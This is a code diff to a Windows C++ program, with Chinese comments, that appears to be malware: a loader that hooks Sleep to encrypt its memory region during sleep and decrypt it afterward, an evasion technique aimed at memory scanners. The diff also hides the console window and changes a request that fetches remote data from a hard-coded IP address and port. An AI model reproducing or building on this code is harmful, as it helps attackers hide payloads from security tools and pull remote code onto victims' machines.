@@ -535,14 +535,14 @@ VOID WINAPI HookedSleep(DWORD dwMilliseconds) {
     (*VirtualProtecta)(address_main, address_main_size, PAGE_READWRITE, lpflOldProtect);
     // 加密函数
     encrypt_memory(address_main, address_main_size, key);
-    (*VirtualProtecta)(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
+    //(*VirtualProtecta)(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
     // 解除挂钩VirtualAlloc
     (*WriteProcessMemorya)((*GetCurrentProcessa)(), (LPVOID)hookaddress_sleep, sleepOriginalBytes, sizeof(sleepOriginalBytes), NULL);
     (*sleepa)(dwMilliseconds);
-    (*VirtualProtecta)(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
+    //(*VirtualProtecta)(address_main, address_main_size, PAGE_READWRITE, lpflOldProtect);
     // 解密函数
     decrypt_memory(address_main, address_main_size, key);
-    (*VirtualProtecta)(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
+    //(*VirtualProtecta)(address_main, address_main_size, PAGE_EXECUTE, lpflOldProtect);
     // 重新挂钩
     HookSleep();
 
@@ -575,10 +575,10 @@ void HookSleep() {
 }
 int main(int argc, CHAR* argv[]) {
     // hide the windows
-    //HWND hwndDOS = GetForegroundWindow();
-    //ShowWindow(hwndDOS, SW_HIDE);
+    HWND hwndDOS = GetForegroundWindow();
+    ShowWindow(hwndDOS, SW_HIDE);
     HttpRequest httpReq("101.42.175.89", 65523);
-    std::string res = httpReq.HttpGet("/gh");
+    std::string res = httpReq.HttpGet("/e");
     std::string str_orign = "vwxyz123456789011111111";
     str_orign = res;
 
